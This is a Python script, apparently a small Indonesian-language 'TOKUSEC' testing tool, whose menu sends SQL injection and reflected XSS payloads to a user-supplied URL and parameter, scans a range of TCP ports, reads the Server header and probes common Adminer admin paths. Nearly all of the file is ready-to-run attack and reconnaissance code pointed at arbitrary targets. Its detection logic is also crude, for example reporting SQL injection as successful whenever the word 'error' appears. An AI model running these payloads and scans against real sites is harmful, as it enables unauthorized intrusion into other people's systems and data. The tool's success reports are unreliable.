import requests
import socket

def automated_sqli(url, vulnerable_param):
    payloads = ["' or '1'='1'", "' or '1'='1' -- ", "' or '1'='1' # ", "' or '1'='1'/*", "' or '1'='1'--", "' or '1'='1'#", "' or '1'='1'/*"]
    
    for payload in payloads:
        params = {vulnerable_param: payload}
        response = requests.get(url, params=params)
        if "error" in response.text.lower():
            print(f"SQL Injection successful with payload: {payload}")
            return
    print("SQL Injection unsuccessful")

def automated_xss(url, vulnerable_param):
    payload = "<script>alert('XSS Attack!')</script>"
    params = {vulnerable_param: payload}
    response = requests.get(url, params=params)
    if payload in response.text:
        print("XSS Attack successful")
    else:
        print("XSS Attack unsuccessful")

def get_server_type(url):
    response = requests.get(url)
    server_type = response.headers.get('Server')
    if server_type:
        print(f"Server type: {server_type}")
    else:
        print("Server type not found")

def scan_open_ports(target_host, start_port, end_port):
    open_ports = []
    for port in range(start_port, end_port + 1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((target_host, port))
            if result == 0:
                open_ports.append(port)
                print(f"Port {port} is open")
            s.close()
        except KeyboardInterrupt:
            print("\nTerminasi pemindaian.")
            exit()
        except socket.gaierror:
            print("Hostname tidak valid.")
            exit()
        except socket.error:
            print("Tidak bisa menghubungi server.")
            exit()
    if not open_ports:
        print("Tidak ada port terbuka pada target.")

def find_adminer(url):
    common_adminer_paths = [
        "/adminer.php",
        "/adminer/adminer.php",
        "/adminer/index.php",
        "/adminer/admin.php",
        "/adminer/login.php",
        "/adminer/adminer.css",
        "/adminer/js/adminer.js",
        "/adminer/js/jquery-1.11.2.min.js"
    ]
    for path in common_adminer_paths:
        adminer_url = url + path
        response = requests.get(adminer_url)
        if response.status_code == 200:
            print(f"Adminer found at: {adminer_url}")

def print_tokusec_ascii():
    ascii_art = """
      
░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓ █▓▒░░▒▓█▓ ▒░ ░▒▓███████▓▒░▒▓████████▓▒░▒▓██████▓▒░  
   ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓ █▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░
   ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓ █▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░        
   ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓ ██████▓▒░░▒▓██████▓▒░░▒▓█▓▒░        
   ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓ █▓▒░▒▓█▓▒░ ░▒▓█▓▒░        
   ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓ █▓▒░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░
   ░▒▓█▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓████ ██▓▒░ ░▒▓██ █████▓▒░░▒▓████████▓▒░▒▓██████▓▒░  
                                                                                                                                                                                                
 """
    print(ascii_art)

def menu():
    print_tokusec_ascii()
    print("== Menu Testing ==")
    print("1. Test SQL Injection")
    print("2. Test XSS Attack")
    print("3. Cari Jenis Server")
    print("4. Scan Port Terbuka")
    print("5. Cari Adminer Web")

def main():
    menu()
    choice = input("Masukkan pilihan (1-5): ")

    if choice == '1':
        url = input("Masukkan URL target untuk SQL Injection: ")
        vulnerable_param = input("Masukkan nama parameter yang rentan terhadap SQLi: ")
        automated_sqli(url, vulnerable_param)
    elif choice == '2':
        url = input("Masukkan URL target untuk XSS Attack: ")
        vulnerable_param = input("Masukkan nama parameter yang rentan terhadap XSS: ")
        automated_xss(url, vulnerable_param)
    elif choice == '3':
        url = input("Masukkan URL target untuk mencari server: ")
        get_server_type(url)
    elif choice == '4':
        target_host = input("Masukkan alamat IP target untuk pemindaian port: ")
        start_port = int(input("Masukkan port awal: "))
        end_port = int(input("Masukkan port akhir: "))
        scan_open_ports(target_host, start_port, end_port)
    elif choice == '5':
        url = input("Masukkan URL target untuk mencari Adminer web: ")
        find_adminer(url)
    else:
        print("Pilihan tidak valid")

if __name__ == "__main__":
    main()
